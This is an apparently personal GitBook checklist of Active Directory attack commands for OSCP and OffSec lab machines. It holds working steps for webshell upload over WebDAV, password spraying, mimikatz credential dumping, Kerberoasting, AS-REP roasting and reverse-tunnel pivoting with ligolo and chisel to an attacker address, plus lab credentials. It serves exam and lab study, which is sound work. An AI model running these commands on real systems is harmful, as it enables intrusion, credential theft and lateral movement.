---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# AD Set

{% hint style="info" %}
Based on:&#x20;

* PG Practice: Access, Hokkaido, Hutch, Nagoya, Resourced, Vault
* PEN-200: OSCP A, OSCP B, OSCP C
{% endhint %}

{% hint style="warning" %}
The AD set is an assumed breached scenario, i.e. starts on [Creds](ad-set.md#creds). However, the techniques used on the PG Play boxes were included for completeness and can be useful for the Windows standalone machine.
{% endhint %}

## No Creds

<details>

<summary>Port Scan</summary>

The `nmap-scan` script can be found [here](https://github.com/CSpanias/ctf-scripts/tree/main?tab=readme-ov-file#nmap-scansh).

```bash
sudo nmap-scan <target-IP>
```

</details>

<details>

<summary>Domain Enumeration</summary>

* [ ] LDAP Null Bind ([ldapsearch](https://x7331.gitbook.io/boxes/tl-dr/active-directory/ad-tools/ldapsearch))

{% code overflow="wrap" %}
```bash
# Enumerate objects
ldapsearch -v -x -b "DC=DC01,DC=offsec" -H "ldap://192.168.120.108" "(objectclass=*)"

# Enumerate users' description field
uv run nxc ldap DC01 -u '' -p '' -M get-desc-users
```
{% endcode %}

* [ ] User Enumeration ([kerbrute](https://x7331.gitbook.io/boxes/tl-dr/active-directory/ad-tools/kerbrute))

{% code overflow="wrap" %}
```bash
kerbrute userenum -d hokkaido-aerospace.com --dc hokka /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
{% endcode %}

* [ ] SMB Enumeration
  * [ ] [enum4linux-ng](https://x7331.gitbook.io/boxes/services/tcp/shares/139-445-smb#enumeration)
  * [ ] Null, Guest, Anonymous sessions
  * [ ] `WRITE` access ([steal hashes](https://x7331.gitbook.io/boxes/services/tcp/shares/139-445-smb#hashes))
* [ ] Password Spray with `<user>:<user>`

</details>

<details>

<summary>HTTP(S)</summary>

* [ ] [Dirbust](../../web/dirbusting.md) HTTP(S) ports with a [directory list](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-directories.txt) (plus server-specific extensions) and a [file list](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-files.txt)&#x20;

{% code overflow="wrap" %}
```bash
# Dirbust with a directory list
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -ac -c -u http://access/FUZZ -e .aspx,.php,
​
​# Dirbust with a file list
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -ic -ac -c -u http://access/FUZZ
```
{% endcode %}

* [ ] [File Uploads](https://x7331.gitbook.io/boxes/web/file-uploads)
* [ ] [WebDAV](https://x7331.gitbook.io/boxes/web/webdav)

{% code overflow="wrap" %}
```bash
# Connect to WebDAV
cadaver http://x7331
Authentication required for hutch on server 'x7331':
Username: x7331
Password:
# Upload a webshell
dav:/> put /usr/share/webshells/aspx/cmdasp.aspx cmdasp.aspx

# Upload a webshell directly
curl -T '/home/kali/shell.aspx' 'http://192.168.64.122/' -u x7331:Pass123!
```
{% endcode %}

* [ ] [Custom wordlists](https://x7331.gitbook.io/boxes/tools/wordlists)

```bash
# Create a userlist based on the site users
username-anarchy -i site_users > anarchy_output

# Create a passlist based on the site content
cewl --write cewl_output http://192.168.202.21/
```

</details>

<details>

<summary><a href="../../services/shares/smb-139-445.md#usage">SMB</a></summary>

* [ ] List and enumerate shares

{% code overflow="wrap" %}
```bash
# List shares and permissions
uv run nxc smb DC01 -u celia.almeda -p 7k8XHk3dMtmpnC7 --shares

# Download the target share
nxc smb MS02 -u x7331 -p Pass123! -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./ MAX_FILE_SIZE=99999999
```
{% endcode %}

* [ ] `WRITE` access ([steal hashes](https://x7331.gitbook.io/boxes/services/tcp/shares/139-445-smb#hashes))

</details>

## MS01

### Creds

<details>

<summary>User Context</summary>

* [ ] [Privileges](https://x7331.gitbook.io/boxes/tl-dr/infra/os/windows/privilege-escalation/privileges) (if GUI access check for [token elevation](../../)) and [Groups](https://x7331.gitbook.io/boxes/tl-dr/infra/os/windows/privilege-escalation/groups)

```powershell
# User's privileges
whoami /priv

# User's groups
whoami /groups
```

* [ ] [PS History](https://x7331.gitbook.io/boxes/tl-dr/infra/os/windows/host-recon#files)

{% code overflow="wrap" %}
```powershell
# History files of all host's users (assuming default path)
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
{% endcode %}

</details>

<details>

<summary>Host Enumeration</summary>

* [ ] [WinPEAS](https://x7331.gitbook.io/boxes/tl-dr/infra/infra-tools/pe-scripts#windows)
* [ ] [Local Services](https://x7331.gitbook.io/boxes/tl-dr/infra/os/windows/host-recon#system)

</details>

<details>

<summary>Remote Access ✅</summary>

Check for WinRM, RDP, and SSH access:

{% code overflow="wrap" %}
```bash
for service in winrm rdp ssh;do uv run nxc "$service" domain_hosts -u celia.almeda -p 7k8XHk3dMtmpnC7;echo;done | grep +
```
{% endcode %}

</details>

<details>

<summary><a href="../../services/shares/smb-139-445.md#usage">SMB</a></summary>

* [ ] List and enumerate shares

{% code overflow="wrap" %}
```bash
# List shares and permissions
uv run nxc smb DC01 -u celia.almeda -p 7k8XHk3dMtmpnC7 --shares

# Download the target share
nxc smb MS02 -u x7331 -p Pass123! -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./ MAX_FILE_SIZE=99999999
```
{% endcode %}

* [ ] `WRITE` access ([steal hashes](https://x7331.gitbook.io/boxes/services/tcp/shares/139-445-smb#hashes))

</details>

<details>

<summary>Post-Exploitation (Cached Creds) ✅</summary>

* [x] Dump cached credentials

{% code overflow="wrap" %}
```powershell
# Upload binary from the WinRM session
*Evil-WinRM* PS C:\Users\Administrator> upload mimikatz.exe

# Dump active sessions' creds
*Evil-WinRM* PS C:\Users\Administrator>.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump the SAM registry hive
*Evil-WinRM* PS C:\Users\Administrator>.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Dump the LSA secrets
*Evil-WinRM* PS C:\Users\Administrator>.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
```
{% endcode %}

* [x] Password Spray

{% code overflow="wrap" %}
```bash
$ for file in domain_*;do cat "$file";echo;done

$ uv run nxc smb ms01 -u domain_users -p domain_passwords --continue-on-success | grep +
​
$ uv run nxc smb ms01 -u domain_users -H domain_hashes --continue-on-success | grep +
```
{% endcode %}

</details>

<details>

<summary>Pivot (Route to the domain) ✅</summary>

```bash
# Launch the ligolo server
$ sudo ligolo-proxy -selfcert -laddr 192.168.45.216:443
```

{% code overflow="wrap" %}
```powershell
# Upload ligolo-agent via WinRM
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> upload agent.exe

# Connect to the server
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> .\agent.exe -connect 192.168.45.216:443 -ignore-cert
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Configure the routing
ligolo-ng » INFO[0052] Agent joined.   id=0050569e00f6 name="OSCP\\eric.wallows@MS01" remote="192.168.103.141:49318"
ligolo-ng » session
? Specify a session : 1 - OSCP\eric.wallows@MS01 - 192.168.103.141:49318 - 0050569e00f6
[Agent : OSCP\eric.wallows@MS01] » autoroute
? Select routes to add: 10.10.63.141/24
? Create a new interface or use an existing one? Create a new interface
INFO[0105] Generating a random interface name...
INFO[0105] Using interface name savinglester
INFO[0105] Creating routes for savinglester...
? Start the tunnel? Yes
INFO[0106] Starting tunnel to OSCP\eric.wallows@MS01 (0050569e00f6)
```
{% endcode %}

</details>

<details>

<summary>AD Attacks (Domain Data) ✅</summary>

* [x] Domain Data (userlist, bloodhound)

{% code overflow="wrap" %}
```bash
# Create a domain user's list
uv run nxc smb DC01 -u celia.almeda -p 7k8XHk3dMtmpnC7 --users | awk '$1 == "SMB" && $5 != "[+]" && $5 != "-Username-" && $5 != "[*]" && $5 != "Guest" && $5 != "krbtgt" {print $5}' > domain_users

# Collect domain data
uv run nxc ldap DC01.oscp.exam -u celia.almeda -p 7k8XHk3dMtmpnC7 --bloodhound -c All --dns-server 10.10.63.140
```
{% endcode %}

* [x] Password Spray&#x20;
  * [ ] `<user>:<user>`

{% code overflow="wrap" %}
```bash
uv run nxc smb domain_hosts -u domain_users -H domain_hashes --continue-on-success | grep +
​
uv run nxc smb domain_hosts -u domain_users -p domain_passwords --continue-on-success | grep +
```
{% endcode %}

* [x] [Kerberoast](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/kerberoasting)

{% code overflow="wrap" %}
```bash
impacket-GetUserSPNs -request -dc-ip DC01 oscp.exam/celia.almeda:7k8XHk3dMtmpnC7
```
{% endcode %}

* [x] [AS-REPRoast](../../tl-dr/active-directory/attacks/as-reproasting.md)

{% code overflow="wrap" %}
```bash
impacket-GetNPUsers oscp.exam/ -dc-ip DC01 -no-pass -usersfile domain_users
```
{% endcode %}

</details>

## MS02

<details>

<summary>User Context</summary>

* [ ] [Privileges](https://x7331.gitbook.io/boxes/tl-dr/infra/os/windows/privilege-escalation/privileges) (if GUI access check for [token elevation](../../)) and [Groups](https://x7331.gitbook.io/boxes/tl-dr/infra/os/windows/privilege-escalation/groups)

```powershell
# User's privileges
whoami /priv

# User's groups
whoami /groups
```

* [ ] [PS History](https://x7331.gitbook.io/boxes/tl-dr/infra/os/windows/host-recon#files)

{% code overflow="wrap" %}
```powershell
# History files of all host's users (assuming default path)
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
{% endcode %}

</details>

<details>

<summary>Host Enumeration</summary>

* [ ] [WinPEAS](https://x7331.gitbook.io/boxes/tl-dr/infra/infra-tools/pe-scripts#windows)

- [ ] [Local Services](https://x7331.gitbook.io/boxes/tl-dr/infra/os/windows/host-recon#system)

```bash
# Start the chisel server on the attacking host
./chisel server -p 8000 --reverse
```

```powershell
# Connect from the target host
.\chisel.exe client 192.168.45.157:8000 R:6033:127.0.0.1:3306
```

```bash
# Enumerate the forwarded port
mysql -h 127.0.0.1 -P 6033 -u root
```

</details>

<details>

<summary><a href="../../services/shares/smb-139-445.md#usage">SMB</a></summary>

* [ ] List and enumerate shares

{% code overflow="wrap" %}
```bash
# List shares and permissions
uv run nxc smb DC01 -u celia.almeda -p 7k8XHk3dMtmpnC7 --shares

# Download the target share
nxc smb MS02 -u x7331 -p Pass123! -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./ MAX_FILE_SIZE=99999999
```
{% endcode %}

* [ ] `WRITE` access ([steal hashes](https://x7331.gitbook.io/boxes/services/tcp/shares/139-445-smb#hashes))

</details>

<details>

<summary><a href="https://x7331.gitbook.io/boxes/services/tcp/dbms/sql/1433-mssql">MSSQL</a></summary>

* [ ] Enumerate tables
* [ ] Links
* [ ] Users
* [ ] xp\_cmdshell
  * [ ] Host enumeration

</details>

<details>

<summary>AD Attacks</summary>

* [ ] If SPNs (e.g. MSSQL) try [Silver ticket](https://x7331.gitbook.io/boxes/tl-dr/active-directory/persistence/silver-ticket)

</details>

<details>

<summary>Post-Exploitation (Cached Creds)</summary>

* [x] Dump cached credentials

{% code overflow="wrap" %}
```powershell
# Upload binary from the WinRM session
*Evil-WinRM* PS C:\Users\Administrator> upload mimikatz.exe

# Dump active sessions' creds
*Evil-WinRM* PS C:\Users\Administrator>.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump the SAM registry hive
*Evil-WinRM* PS C:\Users\Administrator>.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Dump the LSA secrets
*Evil-WinRM* PS C:\Users\Administrator>.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
```
{% endcode %}

* [x] Password Spray

{% code overflow="wrap" %}
```bash
$ for file in domain_*;do cat "$file";echo;done

$ uv run nxc smb ms01 -u domain_users -p domain_passwords --continue-on-success | grep +
​
$ uv run nxc smb ms01 -u domain_users -H domain_hashes --continue-on-success | grep +
```
{% endcode %}

</details>
